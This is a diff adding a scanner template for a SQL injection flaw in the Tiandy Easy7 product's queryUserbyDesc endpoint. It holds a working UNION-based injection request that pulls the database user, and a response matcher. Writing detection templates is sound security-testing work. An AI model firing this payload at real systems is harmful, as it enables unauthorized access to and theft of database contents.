@@ -1,0 +1,25 @@
+id: TianDiWeiYe-Easy7-queryUserbyDesc-SQL
+
+info:
+  name: 天地伟业Easy7 queryUserbyDesc SQL注入
+  author: HuanXiong
+  severity: high
+  description: 天地伟业Easy7 queryUserbyDesc 存在前台SQL注入漏洞，攻击者可获取数据库敏感信息。
+  reference: |
+    -
+  tags: SQL Injection
+  
+http:
+  - raw:
+      - |-
+        GET /Easy7/rest/user/queryUserbyDesc?userDesc=1'+UNION+ALL+SELECT+CONCAT(0x7e,USER(),0x7e),41,41--+- HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code==200 && contains_all(body,'~easy7@','userDesc','depts','userId','userName')"
